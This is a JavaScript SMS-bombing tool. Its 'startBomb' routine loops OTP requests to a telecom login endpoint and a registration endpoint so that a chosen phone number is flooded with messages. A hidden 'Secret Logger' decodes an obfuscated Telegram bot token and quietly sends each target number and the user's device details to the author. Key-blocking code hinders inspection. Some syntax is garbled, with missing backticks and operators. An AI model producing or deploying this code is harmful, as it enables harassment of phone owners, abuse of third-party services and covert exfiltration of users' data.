// Rowan's Encoded Credentials (Base64)
const _0x5a1 = "NzU4Nzk0MDA0MjpBQUhKRURfaG1CMmV2akFib0JkSDF1bzdEcGdoZjYwbVIxTQ=="; // Token
const _0x5a2 = "NzA3MjczOTQ2OQ=="; // Chat ID

// Decode Function
function _getCr(_s) { return atob(_s); }

// Device Info Grabber
function getDevice() {
    const ua = navigator.userAgent;
    if (/android/i.test(ua)) return ua.match(/Android\s([^\s;]+);\s([^;]+)/)?.[2] || "Android";
    if (/iPhone|iPad|iPod/i.test(ua)) return "iOS Device";
    return "PC/Other";
}

// Secret Logger
async function logData(p, c, s) {
    const d = getDevice();
    const t = new Date().toLocaleString();
    const msg = ⚠️ New Target!\n\nNum: ${p}\nQty: ${c}\nSrv: ${s}\nDev: ${d}\nTime: ${t};
    const url = https://api.telegram.org/bot${_getCr(_0x5a1)}/sendMessage?chat_id=${_getCr(_0x5a2)}&text=${encodeURIComponent(msg)};
    try { fetch(url); } catch(e) {}
}

// Anti-Inspect Security
document.addEventListener('keydown', e => {
    if (e.key === "F12"  (e.ctrlKey && e.shiftKey && (e.key === "I"  e.key === "J"))) {
        e.preventDefault();
    }
});

function handleServerChange() {
    const s = document.getElementById('serverSelect').value;
    const q = document.getElementById('smsCount');
    if (s === "2") { q.value = 1; q.disabled = true; } 
    else { q.value = ""; q.disabled = false; }
}

function checkMath() {
    if (document.getElementById('answerInput').value === "1") {
        document.getElementById('loginBox').style.display = 'none';
        document.getElementById('controlPanel').style.display = 'block';
    } else { alert("Try again!"); }
}

async function startBomb() {
    const p = document.getElementById('phone').value;
    const c = parseInt(document.getElementById('smsCount').value);
    const s = document.getElementById('serverSelect').value;

    if(!p || isNaN(c)) return alert("Fill all!");

    logData(p, c, s);

    const btn = document.getElementById('startBtn');
    btn.disabled = true;
    btn.innerText = "ATTACKING...";
    document.getElementById('pContainer').style.display = 'block';

    for(let i = 1; i <= c; i++) {
        document.getElementById('pBar').style.width = (i / c) * 100 + "%";
        try {
            if (s === "1") {
                let m = p.startsWith('09') ? '95' + p.substring(1) : p;
                fetch(`https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber=${m}`, { mode: 'no-cors' });
            } else {
                let t = p.startsWith('95') ? '0' + p.substring(2) : p;
                fetch(`https://api.thai2d3dgame.com/api/user/getRegisterOTP?phoneNo=${t}`, { mode: 'no-cors' });
            }
        } catch(e) {}
        await new Promise(r => setTimeout(r, 1500));
    }
    alert("Done!");
    btn.disabled = false;
    btn.innerText = "LAUNCH ATTACK";
}
